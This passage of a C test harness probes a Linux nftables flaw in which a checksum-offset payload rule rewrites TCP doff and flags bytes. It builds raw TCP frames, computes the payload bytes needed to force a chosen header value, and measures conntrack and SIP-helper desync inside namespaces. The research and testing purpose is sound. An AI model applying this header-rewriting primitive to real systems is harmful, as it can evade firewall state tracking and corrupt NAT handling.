		snprintf(id, sizeof(id), "%s", tab[i].id);
		for (k = 0; id[k]; k++)
			if (id[k] == ' ')
				id[k] = '_';
		tab[i].fn(out, sizeof(out));
		printf("S %s|%s\n", id, out);
		fflush(stdout);
	}
}


/* ==========================================================================
 * differ542_add.c -- turn 542 (F19): WHO READS doff, AND WHEN.
 *
 * F18 measured the door end to end for a bare SYN: on v7.3 a rule whose store
 * is at transport+20 with `csum type inet csum offset 12` makes the *checksum
 * fixup* write bytes 12..13 of the TCP header -- doff and flags -- while the
 * packet keeps a valid L4 checksum.  It proved the rewritten header reaches a
 * socket and does not crash anything.  It did not prove the *consequence* the
 * fix's message names: a conntrack helper acting on a different transport
 * header base than the endpoint.
 *
 * This battery asks that question for the one helper that rewrites payload
 * offsets: nf_conntrack_sip + nf_nat_sip, over TCP.
 *
 * What the code says, before any measurement (all read from
 * src/linux-7.3-R, the release tree):
 *
 *   nf_conntrack_proto.c:nf_confirm()      helper->help(skb, protoff, ...)
 *                                          runs at LOCAL_IN / POST_ROUTING
 *                                          priority INT_MAX -- i.e. after
 *                                          every nft chain.
 *   nf_conntrack_sip.c:sip_help_tcp()      dataoff = protoff + th->doff*4,
 *                                          re-read from the *current* packet.
 *   nf_nat_sip.c:mangle_packet()           baseoff = protoff + th->doff*4,
 *                                          same read, same call.
 *   nf_nat_helper.c:mangle_contents()      data = skb_network_header+dataoff.
 *   nf_conntrack_proto_tcp.c:tcp_packet()  at PRE_ROUTING, *before* any nft
 *                                          chain: tcplen and the window
 *                                          accounting come from *that* doff.
 *
 * So the prediction this battery exists to falsify is:
 *
 *   P1  the helper and the endpoint read the SAME doff, because the helper is
 *       the last reader before the wire; a rule in FORWARD / INPUT cannot
 *       desync them, it can only desync them both from conntrack's earlier
 *       pass.  Measured by: the address rewrite lands inside the message the
 *       endpoint's socket receives, at the endpoint's own base.
 *   P2  the desync that IS produced is conntrack-vs-endpoint: a segment whose
 *       doff is rewritten DOWN after nf_conntrack_in() makes the endpoint
 *       consume more bytes than conntrack counted, so the endpoint's own ACK
 *       is above receiver.td_end and conntrack drops it as INVALID
 *       (nf_conntrack_proto_tcp.c: "ACK is over upper bound").
 *
 * Topology (one veth pair, two namespaces, the F16/F18 rig):
 *
 *   [ far ns ]  fv1 10.9.0.2/24 --veth-- fv0 10.9.0.1/24 [ this ns ]
 *   raw TCP client 10.7.0.9:40000 -> 10.8.0.5:5060
 *   this ns: DNAT 10.8.0.5:5060 -> 10.9.0.1:5061 (a real listening socket),
 *            ct helper "sip" attached by objref in a prerouting chain,
 *            the door rule in the INPUT chain at priority 0.
 *
 * The client is a hand-built AF_PACKET TCP state machine (SYN / SYN-ACK /
 * ACK / one data segment) so that doff, flags, options and payload are all
 * chosen, and so that the endpoint is a REAL socket whose read() is the
 * endpoint's view.  The parent drives it step by step, because the door rule
 * has to go in *after* the handshake: a SYN rewritten to doff 6 with flags
 * PSH|ACK is not a SYN.
 *
 * Arms (each one number different from its partner):
 *   f19.ctl.hs         handshake only, DNAT+helper, no door    -> ESTABLISHED
 *   f19.ctl.reg        + REGISTER, doff 5, no door             -> URI rewritten
 *   f19.byhand.valid   same, doff 6 + 4 MSS option bytes, no door
 *   f19.door.valid     the door (store writes the MSS bytes) on the doff-5
 *                      segment: if P1 holds, the endpoint receives the SAME
 *                      message as byhand.valid, URI rewritten at the same
 *                      offset -- i.e. the helper parsed at the endpoint's base
 *   f19.door.shift     the door with a store that writes "REGI": the endpoint's
 *                      base moves 4 bytes into the message -> no parse, no
 *                      rewrite (control: the rewrite above is not automatic)
 *   f19.byhand.shift   the same final bytes built by hand, no rule
 *   f19.seq.ctl        doff 6 segment, no door                 -> ACK returns
 *   f19.seq.door       the same segment with the door rewriting 6 -> 5: if P2
 *                      holds the endpoint ACKs 4 bytes conntrack never counted
 *                      and its ACK is dropped INVALID (ct invalid +1, no ACK)
 * ========================================================================== */

/* attribute and enum numbers, read from include/uapi/linux/netfilter/
 * nf_tables.h of the 7.3 tree (the differ hand-defines its uapi, so nothing
 * here comes from the host headers):
 *   NFTA_NAT_TYPE 1 FAMILY 2 REG_ADDR_MIN 3 REG_ADDR_MAX 4
 *   REG_PROTO_MIN 5 REG_PROTO_MAX 6 FLAGS 7 ; NFT_NAT_SNAT 0 DNAT 1
 *   NFTA_CT_HELPER_NAME 1 L3PROTO 2 L4PROTO 3 ; NFT_OBJECT_CT_HELPER 3
 *   NF_INET_PRE_ROUTING 0, LOCAL_IN 1 */
#ifndef NF_INET_PRE_ROUTING
#define NF_INET_PRE_ROUTING 0
#endif
#ifndef NFT_OBJECT_CT_HELPER
#define NFT_OBJECT_CT_HELPER 3
#endif
#ifndef NFT_NAT_SNAT
#define NFT_NAT_SNAT 0
#define NFT_NAT_DNAT 1
#endif
#ifndef NFTA_NAT_TYPE
#define NFTA_NAT_TYPE       1
#define NFTA_NAT_FAMILY     2
#define NFTA_NAT_REG_ADDR_MIN 3
#define NFTA_NAT_REG_ADDR_MAX 4
#define NFTA_NAT_REG_PROTO_MIN 5
#define NFTA_NAT_REG_PROTO_MAX 6
#define NFTA_NAT_FLAGS      7
#endif

#define F542_PORT_SIP    5060
#define F542_PORT_DNAT   5061
#define F542_ADDR_CLIENT 0x0a070009U	/* 10.7.0.9, the raw client          */
#define F542_ADDR_SRV    0x0a080005U	/* 10.8.0.5, the "public" SIP server */
#define F542_NET_CLIENT  0x0a070000U

#define F542_STORE_NONE 0
#define F542_STORE_MSS  1	/* writes 02 04 05 b4 at transport+20 */
#define F542_STORE_REGI 2	/* writes "REGI"                       */

#define F542_PAY_NONE   0
#define F542_PAY_PFX_REG 1	/* payload = pfx[4] + REGISTER   */
#define F542_PAY_PFX_STER 2	/* payload = pfx[4] + "STER ..." */
#define F542_PAY_REG    3	/* payload = REGISTER, no pfx    */
#define F542_PAY_REG_OPT 4	/* payload = REGISTER, pfx = options */
#define F542_PAY_STER_OPT 5	/* payload = "STER ...", pfx = options */

#define F542_DUMP 320		/* payload bytes returned as hex */

/* The SIP message.  The Request-URI and the Contact carry the address the
 * client is talking TO (10.8.0.5:5060) -- the one DNAT translates -- so the
 * helper has something to rewrite in the request direction without any SNAT.
 * The Via carries the client's own address, which a pure DNAT does not
 * translate: it is the control that not every address is touched. */
static const char f542_reg[] =
	"REGISTER sip:10.8.0.5:5060 SIP/2.0\r\n"
	"Via: SIP/2.0/TCP 10.9.0.2:40000;branch=z9hG4bK542\r\n"
	"Max-Forwards: 70\r\n"
	"From: <sip:alice@example.com>;tag=f19\r\n"
	"To: <sip:bob@example.com>\r\n"
	"Call-ID: f19-542@example.com\r\n"
	"CSeq: 1 REGISTER\r\n"
	"Contact: <sip:alice@10.8.0.5:5060>\r\n"
	"Content-Length: 0\r\n"
	"\r\n";

/* the same message with its first four bytes cut: what the endpoint reads when
 * the base moves by four */
static const char f542_reg_tail[] =
	"STER sip:10.8.0.5:5060 SIP/2.0\r\n"
	"Via: SIP/2.0/TCP 10.9.0.2:40000;branch=z9hG4bK542\r\n"
	"Max-Forwards: 70\r\n"
	"From: <sip:alice@example.com>;tag=f19\r\n"
	"To: <sip:bob@example.com>\r\n"
	"Call-ID: f19-542@example.com\r\n"
	"CSeq: 1 REGISTER\r\n"
	"Contact: <sip:alice@10.8.0.5:5060>\r\n"
	"Content-Length: 0\r\n"
	"\r\n";

/* The kernel's own arithmetic, copied from include/net/checksum.h of the 7.3
 * tree rather than remembered:
 *   csum_add(a,b)  = a + b, plus 1 if the 32-bit add wrapped
 *   csum_sub(a,b)  = csum_add(a, ~b)
 *   csum_fold(w)   = ~((w + (w>>16)) folded twice)
 *   csum_replace4(sum, from, to) = fold( ( ~sum - from ) + to )
 * and nft_payload.c calls nft_csum_replace(&sum, fsum, tsum) with
 *   fsum = skb_checksum(skb, transport+20, 4)   -- the ORIGINAL payload word
 *   tsum = csum_partial(store, 4)               -- the store's four bytes
 * The first version of this file used "V = O + csum(W0) - csum(S)" with plain
 * 16-bit arithmetic; that is off by one for seq.door and it was caught by
 * replaying the three F18 measurements through this model (0x6002, 0x22d3,
 * 0xf002 all reproduce; the plain formula does not). */
static unsigned int f542_csum_add(unsigned int a, unsigned int b)
{
	unsigned int r = a + b;

	if (r < a)
		r++;
	return r;
}

static unsigned int f542_csum_fold(unsigned int w)
{
	unsigned int s = (w & 0xffff) + (w >> 16);

	s = (s & 0xffff) + (s >> 16);
	return (~s) & 0xffff;
}

static unsigned int f542_csum_partial(const unsigned char *b, int len)
{
	unsigned int s = 0;
	int i;

	for (i = 0; i + 1 < len; i += 2)
		s += ((unsigned int)b[i] << 8) | b[i + 1];
	if (len & 1)
		s += (unsigned int)b[len - 1] << 8;
	return s;
}

static unsigned int f542_replace4(unsigned int sum, unsigned int from,
				  unsigned int to)
{
	unsigned int tmp = f542_csum_add((~sum) & 0xffffffffU, (~from) & 0xffffffffU);

	return f542_csum_fold(f542_csum_add(tmp, to));
}

/* what bytes 12..13 become, given the old word, the store and the four bytes
 * that were in the payload before the store overwrote them */
static unsigned int f542_predict(unsigned int O, const unsigned char S[4],
				 const unsigned char W0[4])
{
	return f542_replace4(O, f542_csum_partial(W0, 4),
			     f542_csum_partial(S, 4));
}

/* the four bytes to send so that bytes 12..13 become V */
static int f542_compute_w0(unsigned int V, unsigned int O,
			   const unsigned char S[4], unsigned char w0[4])
{
	unsigned int cw;

	for (cw = 0; cw < 0x10000; cw++) {
		unsigned char cand[4];

		cand[0] = (unsigned char)(cw >> 8);
		cand[1] = (unsigned char)(cw & 0xff);
		cand[2] = 0;
		cand[3] = 0;
		if (f542_predict(O, S, cand) == V) {
			memcpy(w0, cand, 4);
			return 0;
		}
	}
	return -1;
}

static int f542_payload(int id, const unsigned char pfx[4],
			unsigned char *p, int max)
{
	int mlen = (int)sizeof(f542_reg) - 1;
	int tlen = (int)sizeof(f542_reg_tail) - 1;
	int n = 0;

	switch (id) {
	case F542_PAY_NONE:
		return 0;
	case F542_PAY_PFX_REG:
		if (max < 4 + mlen)
			return -1;
		memcpy(p, pfx, 4);
		memcpy(p + 4, f542_reg, (size_t)mlen);
		n = 4 + mlen;
		break;
	case F542_PAY_PFX_STER:
		if (max < 4 + tlen)
			return -1;
		memcpy(p, pfx, 4);
		memcpy(p + 4, f542_reg_tail, (size_t)tlen);
		n = 4 + tlen;
		break;
	case F542_PAY_REG:
	case F542_PAY_REG_OPT:
		if (max < mlen)
			return -1;
		memcpy(p, f542_reg, (size_t)mlen);
		n = mlen;
		break;
	case F542_PAY_STER_OPT:
		if (max < tlen)
			return -1;
		memcpy(p, f542_reg_tail, (size_t)tlen);
		n = tlen;
		break;
	default:
		return -1;
	}
	return n;
}

/* ---- one Ethernet+IPv4+TCP frame, every field chosen ---- */
static int f542_frame(unsigned char *f, uint32_t saddr, uint32_t daddr,
		      uint32_t sport, uint32_t dport, uint32_t seq, uint32_t ack,
		      int doff, int flags, const unsigned char *opts,
		      const unsigned char *pay, int plen)
{
	unsigned char *ip = f + 14;
	unsigned char *tcp = ip + 20;
	unsigned char pseudo[12];
	int hlen = doff * 4;
	int tot = 20 + hlen + plen;
	unsigned short c;

	memcpy(f, f539_mac_me, 6);
	memcpy(f + 6, f539_mac_far, 6);
	f[12] = 0x08;
	f[13] = 0x00;
	memset(ip, 0, 20);
	ip[0] = 0x45;
	ip[2] = (unsigned char)(tot >> 8);
	ip[3] = (unsigned char)(tot & 0xff);
	ip[8] = 64;
	ip[9] = IPPROTO_TCP;
	*(uint32_t *)(ip + 12) = htonl(saddr);
	*(uint32_t *)(ip + 16) = htonl(daddr);
	*(unsigned short *)(ip + 10) = htons(f539_csum(ip, 20));

	memset(tcp, 0, (size_t)hlen);
	*(uint16_t *)(tcp + 0) = htons((uint16_t)sport);
	*(uint16_t *)(tcp + 2) = htons((uint16_t)dport);
	*(uint32_t *)(tcp + 4) = htonl(seq);
	*(uint32_t *)(tcp + 8) = htonl(ack);
	tcp[12] = (unsigned char)(doff << 4);
	tcp[13] = (unsigned char)flags;
	*(uint16_t *)(tcp + 14) = htons(0xffff);
	if (opts && hlen > 20)
		memcpy(tcp + 20, opts, (size_t)(hlen - 20));
	if (pay && plen > 0)
		memcpy(tcp + hlen, pay, (size_t)plen);

	memcpy(pseudo, ip + 12, 8);
	pseudo[8] = 0;
	pseudo[9] = IPPROTO_TCP;
	pseudo[10] = (unsigned char)((hlen + plen) >> 8);
	pseudo[11] = (unsigned char)((hlen + plen) & 0xff);
	c = (unsigned short)~f541_csum16(tcp, hlen + plen,
					 f541_csum16(pseudo, 12, 0));
	*(unsigned short *)(tcp + 16) = htons(c);
	return 14 + tot;
}

/* ---- the far side: a raw TCP client with per-connection state ---- */
struct f542_conn {
	int fd;
	int used;
	uint32_t sport;
	uint32_t seq;		/* next byte we send  */
	uint32_t ack;		/* next byte we ack   */
};

static struct f542_conn f542_c[8];

static int f542_pkt_type_ok(const struct sockaddr_ll *from)
{
	return from->sll_pkttype != PACKET_OUTGOING;
}

static uint32_t f542_acks[4];	/* up to four ack_seq values, in order */
static uint32_t f542_aflags[4];

static int f542_wait_tcp(int fd, uint32_t mysport, uint32_t *srv_seq,
			 uint32_t *rflags, int *nseen, uint32_t *rack,
			 int want_ack, int ms)
{
	struct pollfd pfd;
	unsigned char buf[2048];
	int waited = 0;

	pfd.fd = fd;
	pfd.events = POLLIN;
	*nseen = 0;
	while (waited < ms) {
		struct sockaddr_ll from;
		socklen_t fl = sizeof(from);
		ssize_t r;

		if (poll(&pfd, 1, 50) > 0) {
			r = recvfrom(fd, buf, sizeof(buf), MSG_DONTWAIT,
				     (struct sockaddr *)&from, &fl);
			if (r >= 40 && f542_pkt_type_ok(&from) &&
			    buf[12] == 0x08 && buf[13] == 0x00 &&
			    buf[14 + 9] == IPPROTO_TCP) {
				uint32_t sport = ((uint32_t)buf[34] << 8) | buf[35];
				uint32_t dport = ((uint32_t)buf[36] << 8) | buf[37];
				uint32_t flags = buf[47];
				uint32_t aseq = ((uint32_t)buf[38] << 24) |
						((uint32_t)buf[39] << 16) |
						((uint32_t)buf[40] << 8) | buf[41];
				uint32_t aack = ((uint32_t)buf[42] << 24) |
						((uint32_t)buf[43] << 16) |
						((uint32_t)buf[44] << 8) | buf[45];

				if (dport != mysport ||
				    (sport != F542_PORT_SIP &&
				     sport != F542_PORT_DNAT))
					continue;
				if (want_ack) {
					/* an ACK of our data: ACK set, SYN clear --
					 * without the SYN test a retransmitted SYN-ACK
					 * counts as an ACK (measured: nack=2, rflags=12) */
					if (!(flags & 0x10) || (flags & 0x02))
						continue;
					if (*nseen == 0) {
						*rack = aack;
						*rflags = flags;
					}
					if (*nseen < 4) {
						f542_acks[*nseen] = aack;
						f542_aflags[*nseen] = flags;
					}
				} else {
					if (!(flags & 0x02))
						continue;
					if (*nseen == 0) {
						*srv_seq = aseq;
						*rflags = flags;
					}
				}
				(*nseen)++;
			}
		}
		waited += 50;
	}
	return 0;
}

/* K <cid> <sport> : SYN, wait for SYN-ACK, ACK.  Reply:
 *   D 0 <nseen> <srv_seq> <rflags>                                          */
static int f542_peer_open(int cid, uint32_t sport, char *rep, size_t n)
{
	struct f542_conn *c;
	struct sockaddr_ll sll;
	unsigned char f[256];
	int idx = f539_ifindex("fv1");
	int len, rc = 0, nseen = 0;
	uint32_t srv_seq = 0, rflags = 0;
	uint32_t myseq = 0x20000000U + (uint32_t)cid * 0x10000U;

	if (cid < 0 || cid >= 8 || idx < 0)
		return -1;
	c = &f542_c[cid];
	if (c->used)
		return -1;
	memset(c, 0, sizeof(*c));
	c->fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (c->fd < 0)
		return -1;
	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_IP);
	sll.sll_ifindex = idx;
	sll.sll_halen = 6;
	memcpy(sll.sll_addr, f539_mac_me, 6);

	len = f542_frame(f, F542_ADDR_CLIENT, F542_ADDR_SRV, sport, F542_PORT_SIP,
			 myseq, 0, 5, 0x02, NULL, NULL, 0);
	if (sendto(c->fd, f, (size_t)len, 0, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
		close(c->fd);
		c->fd = -1;
		return -2;
	}
	f542_wait_tcp(c->fd, sport, &srv_seq, &rflags, &nseen, &rflags, 0, 1200);
	if (nseen == 0) {
		snprintf(rep, n, "D 1 0 0 0\n");
		return 0;
	}
	c->sport = sport;
	c->seq = myseq + 1;
	c->ack = srv_seq + 1;
	len = f542_frame(f, F542_ADDR_CLIENT, F542_ADDR_SRV, sport, F542_PORT_SIP,
			 c->seq, c->ack, 5, 0x10, NULL, NULL, 0);
	if (sendto(c->fd, f, (size_t)len, 0, (struct sockaddr *)&sll, sizeof(sll)) < 0)
		rc = -3;
	c->used = 1;
	snprintf(rep, n, "D %d %d %u %u\n", rc, nseen, srv_seq, rflags);
	return 0;
}

/* N <cid> <doff> <flags> <payid> <pfx8hex> : one data segment, then wait for
 * the endpoint's ACK.  Reply:
 *   D 0 <nack> <ackseq> <rflags>                                            */
static int f542_peer_data(int cid, int doff, int flags, int payid,
			  const unsigned char pfx[4], char *rep, size_t n)
{
	struct f542_conn *c;
	struct sockaddr_ll sll;
	unsigned char f[2048];
	unsigned char pay[1024];
	unsigned char opts[4];
	const unsigned char *optp = NULL;
	int idx = f539_ifindex("fv1");
	int plen, len, nack = 0, rc = 0;
	uint32_t rack = 0, rflags = 0;

	if (cid < 0 || cid >= 8 || !f542_c[cid].used || idx < 0)
		return -1;
	c = &f542_c[cid];
	plen = f542_payload(payid, pfx, pay, (int)sizeof(pay));
	if (plen < 0)
		return -1;
	if (payid == F542_PAY_REG_OPT || payid == F542_PAY_STER_OPT) {
		memcpy(opts, pfx, 4);
		optp = opts;
	}
	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_IP);
	sll.sll_ifindex = idx;
	sll.sll_halen = 6;
	memcpy(sll.sll_addr, f539_mac_me, 6);
	len = f542_frame(f, F542_ADDR_CLIENT, F542_ADDR_SRV, c->sport,
			 F542_PORT_SIP, c->seq, c->ack, doff, flags, optp,
			 pay, plen);
	if (sendto(c->fd, f, (size_t)len, 0, (struct sockaddr *)&sll, sizeof(sll)) < 0)
		rc = -2;
	f542_wait_tcp(c->fd, c->sport, NULL, &rflags, &nack, &rack, 1, 700);
	/* second pass: every frame from the server, ACK or not -- a RST or a
	 * challenge ACK says the endpoint saw the segment and refused it */
	snprintf(rep, n, "D %d %d %u %u %u:%u %u:%u %u:%u\n", rc, nack, rack,
		 rflags, f542_acks[0], f542_aflags[0], f542_acks[1], f542_aflags[1],
		 f542_acks[2], f542_aflags[2]);
	return 0;
}

static void f542_peer_close(int cid)
{
	if (cid < 0 || cid >= 8)
		return;
	if (f542_c[cid].fd >= 0)
		close(f542_c[cid].fd);
	memset(&f542_c[cid], 0, sizeof(f542_c[cid]));
	f542_c[cid].fd = -1;
}

/* E : the far side needs one route to the raw client's subnet, otherwise the
 * box's replies for 10.7.0.9 make the far kernel emit "no route" ICMP noise */
static int f542_peer_extra(void)
{
	int rc = f539_route_add("fv1", F542_NET_CLIENT, 24, 0);

	f539_sysctl("/proc/sys/net/ipv4/conf/fv1/rp_filter", "0");
	return rc < 0 ? rc : 0;
}

/* ---- nft objects and chains for this battery ---- */

#define F542_OBJ_CTHELPER_NAME 1
#define F542_OBJ_CTHELPER_L3   2
#define F542_OBJ_CTHELPER_L4   3

static struct nlmsghdr *op_newobj_cthelper(const char *table, const char *name)
{
	struct nlmsghdr *nlh;
	struct nlattr *data;
	uint8_t l4 = IPPROTO_TCP;
	uint16_t l3 = htons(NFPROTO_IPV4);

	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWOBJ,
			NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL,
			NFPROTO_IPV4);
	put_str(nlh, F13_OBJ_TABLE, table, "f19.obj.table");
	put_str(nlh, F13_OBJ_NAME, name, "f19.obj.name");
	put_be32(nlh, F13_OBJ_TYPE, NFT_OBJECT_CT_HELPER, "f19.obj.type");
	data = nest_start(nlh, F13_OBJ_DATA, "f19.obj.data");
	put_str(nlh, F542_OBJ_CTHELPER_NAME, "sip", "f19.obj.helper");
	attr_put(nlh, F542_OBJ_CTHELPER_L3, &l3, 2, "f19.obj.l3");
	attr_put(nlh, F542_OBJ_CTHELPER_L4, &l4, 1, "f19.obj.l4");
	nest_end(nlh, data);
	nops++;
	return nlh;
}

/* a chain whose type is "nat" (the filter chains use op_newchain) */
static struct nlmsghdr *op_newchain_nat(const char *table, const char *chain,
					int hooknum, int priority)
{
	struct nlmsghdr *nlh;
	struct nlattr *hook;

	cur_op = nops;
	nlh = msg_start(opbuf[nops], (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWCHAIN,
			NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL,
			NFPROTO_IPV4);
	put_str(nlh, NFTA_CHAIN_TABLE, table, "f19.nat.table");
	put_str(nlh, NFTA_CHAIN_NAME, chain, "f19.nat.name");
	put_str(nlh, NFTA_CHAIN_TYPE, "nat", "f19.nat.type");
	put_be32(nlh, NFTA_CHAIN_POLICY, NF_ACCEPT, "f19.nat.policy");
	hook = nest_start(nlh, NFTA_CHAIN_HOOK, "f19.nat.hook");
	put_be32(nlh, NFTA_HOOK_HOOKNUM, (uint32_t)hooknum, "f19.nat.hooknum");
	put_be32(nlh, NFTA_HOOK_PRIORITY, (uint32_t)priority, "f19.nat.priority");
	nest_end(nlh, hook);
	nops++;
	return nlh;
}

static struct nlmsghdr *f542_rule_begin(const char *table, const char *chain)
{
	struct nlmsghdr *nlh = msg_start(opbuf[nops],
		(NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWRULE,
		NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_APPEND,
		NFPROTO_IPV4);

	cur_op = nops;
	put_str(nlh, NFTA_RULE_TABLE, table, "f19.rule.table");
	put_str(nlh, NFTA_RULE_CHAIN, chain, "f19.rule.chain");
	return nlh;
}

/* rule: objref <ct helper>  -- attaches the SIP helper to the ct template */
static struct nlmsghdr *op_newrule_ctl_helper(const char *table, const char *chain,
					      const char *objname)
{
	struct nlmsghdr *nlh = f542_rule_begin(table, chain);
	struct nlattr *exprs = nest_start(nlh, NFTA_RULE_EXPRESSIONS, "f19.rule.exprs");

	f13_objref_expr(nlh, objname, NFT_OBJECT_CT_HELPER);
	nest_end(nlh, exprs);
	nops++;
	return nlh;
}

/* rule: dnat ip to 10.9.0.1:5061 */
#define F542_REG_ADDR  NFT_REG32_00
#define F542_REG_PORT  NFT_REG32_01

static struct nlmsghdr *op_newrule_dnat(const char *table, const char *chain,
					uint32_t addr_host, uint16_t port_host)
{
	struct nlmsghdr *nlh = f542_rule_begin(table, chain);
	struct nlattr *exprs = nest_start(nlh, NFTA_RULE_EXPRESSIONS, "f19.rule.exprs");
	unsigned char ab[4];
	unsigned char pb[2];
	struct nlattr *e, *d;
	uint32_t a = htonl(addr_host);

	memcpy(ab, &a, 4);
	pb[0] = (unsigned char)(port_host >> 8);
	pb[1] = (unsigned char)(port_host & 0xff);
	exfil_imm_value(nlh, F542_REG_ADDR, ab, 4);
	exfil_imm_value(nlh, F542_REG_PORT, pb, 2);
	e = nest_start(nlh, NFTA_LIST_ELEM, "f19.nat.elem");
	put_str(nlh, NFTA_EXPR_NAME, "nat", "f19.nat.expr");
	d = nest_start(nlh, NFTA_EXPR_DATA, "f19.nat.expr.data");
	put_be32(nlh, NFTA_NAT_TYPE, NFT_NAT_DNAT, "f19.nat.type");
	put_be32(nlh, NFTA_NAT_FAMILY, NFPROTO_IPV4, "f19.nat.family");
	put_be32(nlh, NFTA_NAT_REG_ADDR_MIN, F542_REG_ADDR, "f19.nat.reg_addr");
	put_be32(nlh, NFTA_NAT_REG_PROTO_MIN, F542_REG_PORT, "f19.nat.reg_port");
	nest_end(nlh, d);
	nest_end(nlh, e);
	nest_end(nlh, exprs);
	nops++;
	return nlh;
}

/* the door: @th,160,32 set <store> csum type inet csum offset 12 */
static struct nlmsghdr *op_newrule_door542(const char *table, const char *chain,
					   const unsigned char store[4])
{
	struct nlmsghdr *nlh = f542_rule_begin(table, chain);
	struct nlattr *exprs = nest_start(nlh, NFTA_RULE_EXPRESSIONS, "f19.rule.exprs");

	exfil_imm_value(nlh, NFT_REG32_00, store, 4);
	c540_payload_set(nlh, NFT_REG32_00, NFT_PAYLOAD_TRANSPORT_HEADER,
			 20, 4, NFT_PAYLOAD_CSUM_INET, 12);
	nest_end(nlh, exprs);
	nops++;
	return nlh;
}

/* /proc/net/stat/nf_conntrack, summed over CPUs, by COLUMN NAME: "invalid"
 * counts packets the L4 protocol judged invalid, "drop" counts the ones that
 * were then dropped.  A packet can be invalid and still be accepted (the
 * be_liberal path), so the two columns answer two different questions. */
static int f542_ct_stat(const char *name, unsigned long long *val)
{
	FILE *fp = fopen("/proc/net/stat/nf_conntrack", "r");
	char buf[4096];
	int col = -1;

	*val = 0;
	if (!fp)
		return -1;
	while (fgets(buf, sizeof(buf), fp)) {
		char *p = buf;
		int idx = 0;

		if (col < 0) {
			while (*p) {
				char *tok = p;

				while (*p && *p != ' ' && *p != '\n')
					p++;
				if (*p)
					*p++ = 0;
				if (!strcmp(tok, name)) {
					col = idx;
					break;
				}
				idx++;
				while (*p == ' ')
					p++;
			}
			if (col < 0)
				break;
			continue;
		}
		{
			int i = 0;
			unsigned long long v = 0;

			while (*p && i <= col) {
				while (*p == ' ')
					p++;
				v = strtoull(p, &p, 16);
				i++;
			}
			if (i > col)
				*val += v;
		}
	}
	fclose(fp);
	return col < 0 ? -2 : 0;
}

/* ---- counters the scenario reads around the exchange ---- */
static int f542_ct_lines(uint32_t sport, int *n, int *helper)
{
	FILE *fp = fopen("/proc/net/nf_conntrack", "r");
	char buf[1024];
	char pat[32];

	*n = 0;
	*helper = 0;
	if (!fp)
		return -1;
	snprintf(pat, sizeof(pat), "sport=%u ", sport);
	while (fgets(buf, sizeof(buf), fp)) {
		if (!strstr(buf, pat))
			continue;
		(*n)++;
		if (strstr(buf, "helper=sip"))
			*helper = 1;
	}
	fclose(fp);
	return 0;
}

/* ---- one scenario ---- */
struct f542_arm {
	const char *id;
	int nohelper;		/* 1 = DNAT only, no ct helper object/objref */
	int store;		/* F542_STORE_* in the door rule, NONE = no rule */
	int payid;
	int segdoff;
	int segflags;
	unsigned int targetV;	/* what bytes 12..13 must become              */
	unsigned int oldO;	/* the word they hold before the store        */
};

static int f542_run(const struct f542_arm *a, char *out, size_t n)
{
	struct f539_env e;
	char tab[32];
	char line[512];
	unsigned char w0[4] = { 0, 0, 0, 0 };
	unsigned char store[4] = { 0, 0, 0, 0 };
	unsigned char pfx[4] = { 0, 0, 0, 0 };
	unsigned char rx[F542_DUMP];
	int lfd = -1, cfd = -1, errs, i, off = 0;
	int hsn = 0, acc = 0, nack = 0, rxlen = 0, ctlines = 0, cthelper = 0;
	unsigned int srv_seq = 0, rflags = 0, rack = 0, hsflags = 0;
	unsigned long long iv0 = 0, iv1 = 0;
	unsigned long long is0 = 0, is1 = 0, ie0 = 0, ie1 = 0, cs0 = 0, cs1 = 0;
	unsigned long long ivd0 = 0, ivd1 = 0, dr0 = 0, dr1 = 0;
	unsigned int a0 = 0, af0 = 0, a1 = 0, af1 = 0, a2 = 0, af2 = 0;
	int urioff = -1;
	static int f542_nport;
	uint32_t sport = 40100U + (uint32_t)(f542_nport++) * 4U;

	memset(rx, 0, sizeof(rx));
	memset(line, 0, sizeof(line));
	if (f539_env_open(&e, out, n) < 0) {
		f539_env_close(&e);
		return 0;
	}
	/* the client's subnet is reachable through the same veth, so the box's
	 * replies (SYN-ACK, ACK asks) have a route and a neighbour and do not
	 * wait on ARP */
	f539_route_add("fv0", F542_NET_CLIENT, 24, 0);
	f539_arp("fv0", F542_ADDR_CLIENT, f539_mac_far);
	f539_sysctl("/proc/sys/net/netfilter/nf_conntrack_tcp_loose", "1");

	if (a->store != F542_STORE_NONE) {
		if (a->store == F542_STORE_MSS) {
			store[0] = 0x02;
			store[1] = 0x04;
			store[2] = 0x05;
			store[3] = 0xb4;	/* MSS 1460: a legal option */
		} else {
			store[0] = 'R';
			store[1] = 'E';
			store[2] = 'G';
			store[3] = 'I';
		}
		if (f542_compute_w0(a->targetV, a->oldO, store, w0) < 0) {
			f539_env_close(&e);
			snprintf(out, n, "setup=W0_FAIL");
			return 0;
		}
	}

	/* 1. the endpoint: a real listening socket at the DNAT target */
	lfd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
	if (lfd >= 0) {
		struct sockaddr_in sa;
		int one = 1;

		memset(&sa, 0, sizeof(sa));
		sa.sin_family = AF_INET;
		sa.sin_port = htons(F542_PORT_DNAT);
		sa.sin_addr.s_addr = htonl(F539_ADDR_ME);
		setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
		if (bind(lfd, (struct sockaddr *)&sa, sizeof(sa)) < 0 ||
		    listen(lfd, 8) < 0) {
			close(lfd);
			lfd = -1;
		}
	}
	if (lfd < 0) {
		f539_env_close(&e);
		snprintf(out, n, "setup=LISTEN_FAIL");
		return 0;
	}

	/* 2. NAT + the ct helper, before the first packet of the flow */
	snprintf(tab, sizeof(tab), "t542_%d_%d", (int)getpid(), a->store);
	nops = 0;
	nrecs = 0;
	op_newtable(tab);
	if (!a->nohelper) {
		op_newobj_cthelper(tab, "sip");
		/* the ct helper object needs a ct on the skb: after conntrack
		 * (-200), before the nat chain and before confirm (INT_MAX) */
